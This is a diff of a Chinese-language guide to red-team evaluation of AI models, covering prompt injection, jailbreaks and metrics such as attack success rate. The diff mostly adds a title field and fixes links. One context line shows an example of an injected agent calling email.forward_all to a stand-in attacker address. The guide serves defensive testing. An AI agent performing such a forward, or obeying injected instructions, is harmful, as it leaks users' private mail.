@@ -19,8 +19,11 @@ sources:
   - "https://github.com/microsoft/Counterfit"
   - "https://arxiv.org/abs/2209.07858"
 
+name_zh: "红队评估与对抗性测试指南"
 ---
 # 红队评估与对抗性测试指南 (Red Team Evaluation Guide)
+
+> 中文简称：红队评估与对抗性测试指南
 
 > **一句话理解**: 红队评估就像为 AI 系统做"压力体检"——在恶意攻击者发现漏洞之前，用系统化的对抗性测试方法（提示注入、越狱、数据提取）主动暴露模型的薄弱环节，并用 ASR、Refusal Rate 等可量化指标衡量安全水位。
 
@@ -239,7 +242,7 @@ Agent: [调用 email.forward_all(recipient="attacker@evil.com")]
 
 红队应重点测试：**Agent 是否会在被诱导时执行破坏性操作？**（如删除文件、发送邮件、执行支付）。
 
-> **深入阅读**: Agent 安全的完整测试方法见 [[../17_伦理安全/04_AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] 和 [[../03_LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]]。
+> **深入阅读**: Agent 安全的完整测试方法见 [[../17_伦理安全/04_AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] 和 [[08_模型评估/03_LLM_Evaluation/Agent_Evaluation|Agent 评估框架]]。
 
 ---
 
@@ -1436,7 +1439,7 @@ graph LR
 - [[../01_Evaluation_Fundamentals/Model_Evaluation|模型评估]] — 模型评估总论（指标体系基础）
 - [[../04_Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]] — 红队评估的自动判定方法
 - [[../02_Benchmarks/LLM_Benchmark_Suite_2026|LLM Benchmark Suite 2026]] — 安全相关基准（TruthfulQA、HarmBench）
-- [[../03_LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]] — Agent 安全测试（过度授权风险）
+- [[08_模型评估/03_LLM_Evaluation/Agent_Evaluation|Agent 评估框架]] — Agent 安全测试（过度授权风险）
 - [[../Fairness_Evaluation_for_dummy|公平性评估]] — 偏见与公平性测试方法
 - [[../../治理/safety-evaluation-red-teaming|安全评测 × 红队]] — 治理视角的评估与攻击迭代
 - [[../README|模型评估总览]] — 模型评估章节导航
